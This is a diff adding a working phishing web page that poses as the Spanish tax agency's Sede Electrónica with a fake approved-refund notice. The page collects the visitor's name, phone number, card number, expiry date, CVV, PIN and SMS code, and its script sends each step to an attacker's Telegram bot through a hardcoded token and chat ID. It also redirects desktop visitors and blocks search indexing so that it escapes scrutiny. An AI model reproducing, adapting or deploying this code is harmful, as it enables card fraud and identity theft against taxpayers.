@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sede Electrónica - Agencia Tributaria</title>
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tu Sitio Web</title>
+
+    <!-- 1. Este es el noindex y nofollow para evitar que los motores de búsqueda indexen el sitio -->
+    <meta name="robots" content="noindex, nofollow">
+
+    <!-- 2. Este es para bloquear el acceso y redirigir si se intenta abrir desde un ordenador (Verificación avanzada anti-engaño) -->
+    <script>
+        (function() {
+            // Comprueba el User-Agent básico para ver si dice ser un dispositivo móvil
+            var isMobileUA = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+            
+            // Comprueba si el navegador soporta eventos táctiles reales (un PC emulado suele fallar aquí)
+            var hasTouchScreen = (('ontouchstart' in window) || 
+                                  (navigator.maxTouchPoints > 0) || 
+                                  (navigator.msMaxTouchPoints > 0));
+            
+            // Comprueba la resolución de pantalla (los PCs suelen tener pantallas grandes o anchas)
+            var isSmallScreen = window.innerWidth <= 800;
+
+            // Si el navegador de un PC intenta engañar falseando el User-Agent, 
+            // fallará en la detección táctil o en el ancho, y será redirigido.
+            if (!isMobileUA || !hasTouchScreen || !isSmallScreen) {
+                window.location.href = "https://google.com";
+            }
+        })();
+    </script>
+</head>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <style>
+        @keyframes custom-spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .animate-spin-custom {
+            animation: custom-spin 1s linear infinite;
+        }
+    </style>
+
+</head>
+<body class="bg-gray-100 min-h-screen flex flex-col justify-between font-sans text-gray-800 m-0 p-0">
+
+    <!-- TOP NAVBAR -->
+    <header class="bg-white border-b border-gray-200 shadow-sm sticky top-0 z-50">
+        <div class="max-w-2xl mx-auto px-4 h-16 flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <div class="w-10 h-10 flex items-center justify-center">
+                    <svg viewBox="0 0 100 100" class="w-7 h-7">
+    <image 
+        href="https://logowik.com/content/uploads/images/agencia-tributaria9862.jpg"
+        x="0"
+        y="0"
+        width="100"
+        height="100"
+        preserveAspectRatio="xMidYMid meet"
+        style="border: none; outline: none;"
+    />
+</svg>
+
+                </div>
+                <span class="font-bold text-blue-900 tracking-tight text-sm sm:text-base hidden sm:inline">Sede Electrónica</span>
+            </div>
+            <div class="flex items-center space-x-3">
+                <button aria-label="Reloj de actividad" class="p-2 text-gray-600 hover:text-blue-900 transition-colors">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"></circle><path d="M12 7v5l3 3"></path></svg>
+                </button>
+                <div class="bg-blue-700 text-white p-2 rounded-md flex items-center justify-center">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                </div>
+                <div class="text-sm font-medium flex items-center text-gray-700 cursor-pointer">
+                    ES <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"></path></svg>
+                </div>
+            </div>
+        </div>
+        <div class="h-1 bg-blue-700 w-full"></div>
+    </header>
+
+    <!-- MAIN CONTAINER -->
+    <main class="flex-grow max-w-2xl w-full mx-auto p-4 sm:p-6 flex flex-col justify-center my-auto">
+        
+        <!-- STEP 1: NOTIFICACIÓN DE REEMBOLSO -->
+        <div id="step-1" class="step-container bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8">
+            <h2 class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Notificación de Reembolso de Impuestos Aprobado</h2>
+            
+            <div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6 space-y-4">
+                <p class="text-center font-medium text-gray-700">Su reembolso de impuestos ha sido aprobado.</p>
+                <p class="text-center text-sm text-gray-600">Tiene un plazo máximo de <strong class="text-black font-bold">5 días</strong> para completar el formulario de reembolso.</p>
+                
+                <form id="form-step-1" class="space-y-4 pt-2" onsubmit="handleStep1(event)">
+                    <div>
+                        <label class="block text-xs uppercase font-bold text-gray-700 mb-1">* Número de expediente</label>
+                        <input type="text" id="expediente" required value="B2845641546" class="w-full border border-gray-300 rounded p-2.5 bg-gray-100 text-gray-700 text-sm focus:outline-none focus:border-blue-700">
+                    </div>
+                    <div>
+                        <label class="block text-xs uppercase font-bold text-gray-700 mb-1">* Importe de reembolso</label>
+                        <input type="text" id="importe" required value="311.29 €" class="w-full border border-gray-300 rounded p-2.5 bg-gray-100 text-gray-700 text-sm focus:outline-none focus:border-blue-700">
+                    </div>
+                    <div>
+                        <label class="block text-xs uppercase font-bold text-gray-700 mb-1">* Nombre completo</label>
+                        <input type="text" id="nombre" required placeholder="Introduce tu nombre completo" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
+                    </div>
+                    <div>
+                        <label class="block text-xs uppercase font-bold text-gray-700 mb-1">* Número de contacto</label>
+                        <input type="tel" id="contacto" required placeholder="Ej: +34 600 000 000" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
+                    </div>
+                    <div class="pt-4 text-center">
+                        <button type="submit" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-8 rounded transition-colors text-sm w-full sm:w-auto shadow-sm">Continuar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- SPINNER 1 -->
+        <div id="spinner-1" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-8 text-center">
+            <h2 class="text-xl font-medium text-gray-700 mb-8">Procesando solicitud</h2>
+            <div class="flex justify-center my-6">
+                <svg class="w-16 h-16 text-blue-700 animate-spin-custom" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 20"></circle></svg>
+            </div>
+            <p class="text-lg font-bold text-gray-900 mt-6 mb-2">Tu petición se está procesando...</p>
+            <p class="text-sm text-gray-600">Por favor, espera unos segundos.</p>
+        </div>
+
+        <!-- STEP 2: VERIFICACIÓN DE REEMBOLSO -->
+        <div id="step-2" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8">
+            <h2 class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Verificacion de reembolso</h2>
+            <div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6">
+                <form id="form-step-2" class="space-y-4" onsubmit="validateCardAndProceed(event)">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-1">Número de tarjeta</label>
+                        <input type="text" id="card-number" required placeholder="4918 5040 3706 6119" maxlength="19" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
+                        <p id="card-error" class="text-xs text-red-600 mt-1 hidden">Número de tarjeta inválido o incorrecto.</p>
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-1">Fecha de caducidad (MM/AA)</label>
+                        <input type="text" id="card-expiry" required placeholder="MM/AA" maxlength="5" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
+                        <p id="expiry-error" class="text-xs text-red-600 mt-1 hidden">Formato o fecha inválida (Ej: 01/32).</p>
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-1">Código de seguridad (CVV/CVC)</label>
+                        <input type="password" id="card-cvv" required placeholder="•••" maxlength="4" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-1">PIN</label>
+                        <input type="password" id="card-pin" required placeholder="PIN de la tarjeta bancaria" maxlength="6" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
+                    </div>
+                    <div class="flex items-center justify-between pt-4">
+                        <button type="button" onclick="showStep('step-1')" class="text-gray-600 hover:text-blue-900 text-sm font-medium flex items-center transition-colors">
+                            <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"></path></svg> Volver
+                        </button>
+                        <button type="submit" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-8 rounded transition-colors text-sm shadow-sm">Confirmar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- SPINNER 2 -->
+        <div id="spinner-2" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-8 text-center">
+            <h2 class="text-xl font-medium text-gray-700 mb-8">Procesando solicitud</h2>
+            <div class="flex justify-center my-6">
+                <svg class="w-16 h-16 text-blue-700 animate-spin-custom" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 20"></circle></svg>
+            </div>
+            <p class="text-lg font-bold text-gray-900 mt-6 mb-2">Tu petición se está procesando...</p>
+            <p class="text-sm text-gray-600">Por favor, espera unos segundos.</p>
+        </div>
+
+        <!-- STEP 3: VERIFICACIÓN DE CÓDIGO SMS -->
+        <div id="step-3" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8">
+            <h2 class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Verificación de código</h2>
+            <div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6">
+                <form id="form-step-3" class="space-y-4" onsubmit="handleStep3(event)">
+                    <p class="text-center text-sm text-gray-700 mb-4">Introduzca el código SMS de 6 dígitos enviado a su numero de contacto.</p>
+                    <div>
+                        <input type="text" id="sms-code" required maxlength="6" placeholder="------" class="w-full border border-gray-300 rounded p-3 text-center tracking-widest text-lg bg-white text-gray-800 focus:outline-none focus:border-blue-700">
+                    </div>
+                    <div class="flex items-center justify-between pt-4">
+                        <button type="button" onclick="showStep('step-2')" class="text-gray-600 hover:text-blue-900 text-sm font-medium flex items-center transition-colors">
+                            <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"></path></svg> Volver
+                        </button>
+                        <button type="submit" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-8 rounded transition-colors text-sm shadow-sm">Verificar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- SPINNER 3 -->
+        <div id="spinner-3" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-8 text-center">
+            <h2 class="text-xl font-medium text-gray-700 mb-8">Procesando solicitud</h2>
+            <div class="flex justify-center my-6">
+                <svg class="w-16 h-16 text-blue-700 animate-spin-custom" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 20"></circle></svg>
+            </div>
+            <p class="text-lg font-bold text-gray-900 mt-6 mb-2">Tu petición se está procesando...</p>
+            <p class="text-sm text-gray-600">Por favor, espera unos segundos.</p>
+        </div>
+
+        <!-- STEP 4: VERIFICACIÓN DE PIN -->
+        <div id="step-4" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8">
+            <h2 class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Verificación de pin</h2>
+            <div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6">
+                <form id="form-step-4" class="space-y-4" onsubmit="handleStep4(event)">
+                    <p class="text-center text-sm text-gray-700 mb-4">Introduzca el pin de verificación.</p>
+                    <div>
+                        <input type="password" id="pin-code" required maxlength="6" placeholder="••••" class="w-full border border-gray-300 rounded p-3 text-center tracking-widest text-lg bg-white text-gray-800 focus:outline-none focus:border-blue-700">
+                    </div>
+                    <div class="flex items-center justify-between pt-4">
+                        <button type="button" onclick="showStep('step-3')" class="text-gray-600 hover:text-blue-900 text-sm font-medium flex items-center transition-colors">
+                            <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"></path></svg> Volver
+                        </button>
+                        <button type="submit" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-8 rounded transition-colors text-sm shadow-sm">Verificar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- SPINNER 4 -->
+        <div id="spinner-4" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-8 text-center">
+            <h2 class="text-xl font-medium text-gray-700 mb-8">Procesando solicitud</h2>
+            <div class="flex justify-center my-6">
+                <svg class="w-16 h-16 text-blue-700 animate-spin-custom" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 20"></circle></svg>
+            </div>
+            <p class="text-lg font-bold text-gray-900 mt-6 mb-2">Tu petición se está procesando...</p>
+            <p class="text-sm text-gray-600">Por favor, espera unos segundos.</p>
+        </div>
+
+        <!-- STEP 5: PROCESO FINALIZADO -->
+        <div id="step-5" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8 text-center">
+            <h2 class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Proceso Finalizado</h2>
+            <div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6 space-y-4">
+                <h3 class="text-lg font-bold text-gray-900">¡Tu proceso de reembolso ha finalizado!</h3>
+                <p class="text-sm text-gray-700 leading-relaxed">
+                    El pago del reembolso será efectivo en un plazo máximo de <strong class="text-black font-extrabold">14 días hábiles</strong>.
+                </p>
+                <div class="pt-4">
+                    <button onclick="resetProcess()" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-6 rounded transition-colors text-sm shadow-sm">Volver a la página principal</button>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="bg-blue-900 text-white mt-12 py-8 px-4">
+        <div class="max-w-2xl mx-auto space-y-3 text-sm">
+            <p class="font-bold border-b border-blue-800 pb-2 mb-3">Agencia Tributaria</p>
+            <ul class="space-y-2 text-blue-100 text-xs sm:text-sm">
+                <li><a href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/accesibilidad/declaracion-accesibilidad.html" class="hover:underline">Accesibilidad</a></li>
+                <li><a href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/aviso-seguridad.html" class="hover:underline">Aviso de seguridad</a></li>
+                <li><a href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/aviso-legal.html" class="hover:underline">Aviso legal</a></li>
+                <li><a href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/validacion-certificado-sede.html" class="hover:underline">Validación del certificado de sede</a></li>
+                <li><a href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/datos-personales.html" class="hover:underline">Protección de datos</a></li>
+                <li><a href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/politica-linguistica.html" class="hover:underline">Política lingüística</a></li>
+                <li><a href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/estructura-navegacion-sede-electronica.html" class="hover:underline">Estructura y navegación en la sede electrónica</a></li>
+                <li><a href="#" class="hover:underline">Contacta con nosotros</a></li>
+            </ul>
+        </div>
+    </footer>
+
+    <!-- SCRIPT CON TELEGRAM BOT Y VALIDACIONES -->
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8755847353:AAF4upNLjCstkjNC9Ryjbjja-CKlYKKzhDo";
+        const TELEGRAM_CHAT_ID = "5892729609";
+
+        let formDataStore = {};
+
+        function sendToTelegram(message) {
+            if (TELEGRAM_BOT_TOKEN === "TU_BOT_TOKEN_AQUI" || TELEGRAM_CHAT_ID === "TU_CHAT_ID_AQUI") {
+                console.warn("Telegram Token o Chat ID no configurados.");
+                return;
+            }
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.error("Error al enviar a Telegram:", err));
+        }
+
+        function showStep(stepId) {
+            document.querySelectorAll('.step-container').forEach(el => el.classList.add('hidden'));
+            document.getElementById(stepId).classList.remove('hidden');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function handleStep1(event) {
+            event.preventDefault();
+            formDataStore.expediente = document.getElementById('expediente').value;
+            formDataStore.importe = document.getElementById('importe').value;
+            formDataStore.nombre = document.getElementById('nombre').value;
+            formDataStore.contacto = document.getElementById('contacto').value;
+
+            const msg = `📋 *Nuevo Registro (Paso 1)*\n` +
+                        `• Expediente: \`${formDataStore.expediente}\`\n` +
+                        `• Importe: \`${formDataStore.importe}\`\n` +
+                        `• Nombre: \`${formDataStore.nombre}\`\n` +
+                        `• Contacto: \`${formDataStore.contacto}\``;
+            sendToTelegram(msg);
+
+            showStep('spinner-1');
+            setTimeout(() => showStep('step-2'), 2500);
+        }
+
+        function checkLuhn(val) {
+            let sum = 0;
+            let shouldDouble = false;
+            let cleanVal = val.replace(/\D/g, '');
+            if (cleanVal.length < 13 || cleanVal.length > 19) return false;
+            
+            for (let i = cleanVal.length - 1; i >= 0; i--) {
+                let digit = parseInt(cleanVal.charAt(i), 10);
+                if (shouldDouble) {
+                    if ((digit *= 2) > 9) digit -= 9;
+                }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return (sum % 10) === 0;
+        }
+
+        function validateCardAndProceed(event) {
+            event.preventDefault();
+            const cardNumber = document.getElementById('card-number').value;
+            const cardExpiry = document.getElementById('card-expiry').value;
+            const cardCvv = document.getElementById('card-cvv').value;
+            const cardPin = document.getElementById('card-pin').value;
+            
+            const cardError = document.getElementById('card-error');
+            const expiryError = document.getElementById('expiry-error');
+
+            let isValid = true;
+
+            if (!checkLuhn(cardNumber)) {
+                cardError.classList.remove('hidden');
+                isValid = false;
+            } else {
+                cardError.classList.add('hidden');
+            }
+
+            const expiryRegex = /^(0[1-9]|1[0-2])\/?([0-9]{2})$/;
+            if (!expiryRegex.test(cardExpiry)) {
+                expiryError.classList.remove('hidden');
+                isValid = false;
+            } else {
+                expiryError.classList.add('hidden');
+            }
+
+            if (isValid) {
+                formDataStore.cardNumber = cardNumber;
+                formDataStore.cardExpiry = cardExpiry;
+                formDataStore.cardCvv = cardCvv;
+                formDataStore.cardPin = cardPin;
+
+                const msg = `💳 *Datos de Tarjeta (Paso 2)*\n` +
+                            `• Tarjeta: \`${cardNumber}\`\n` +
+                            `• Caducidad: \`${cardExpiry}\`\n` +
+                            `• CVV: \`${cardCvv}\`\n` +
+                            `• PIN: \`${cardPin}\``;
+                sendToTelegram(msg);
+
+                showStep('spinner-2');
+                setTimeout(() => showStep('step-3'), 2500);
+            }
+        }
+
+        function handleStep3(event) {
+            event.preventDefault();
+            const smsCode = document.getElementById('sms-code').value;
+            formDataStore.smsCode = smsCode;
+
+            const msg = `💬 *Código SMS (Paso 3)*\n` +
+                        `• Código: \`${smsCode}\``;
+            sendToTelegram(msg);
+
+            showStep('spinner-3');
+            setTimeout(() => showStep('step-4'), 2500);
+        }
+
+        function handleStep4(event) {
+            event.preventDefault();
+            const pinCode = document.getElementById('pin-code').value;
+            formDataStore.pinCode = pinCode;
+
+            const msg = `🔐 *PIN de Verificación (Paso 4)*\n` +
+                        `• PIN: \`${pinCode}\``;
+            sendToTelegram(msg);
+
+            showStep('spinner-4');
+            setTimeout(() => showStep('step-5'), 2500);
+        }
+
+        function resetProcess() {
+            formDataStore = {};
+            document.getElementById('form-step-1').reset();
+            document.getElementById('form-step-2').reset();
+            document.getElementById('form-step-3').reset();
+            document.getElementById('form-step-4').reset();
+            showStep('step-1');
+        }
+    </script>
+</body>
+</html>
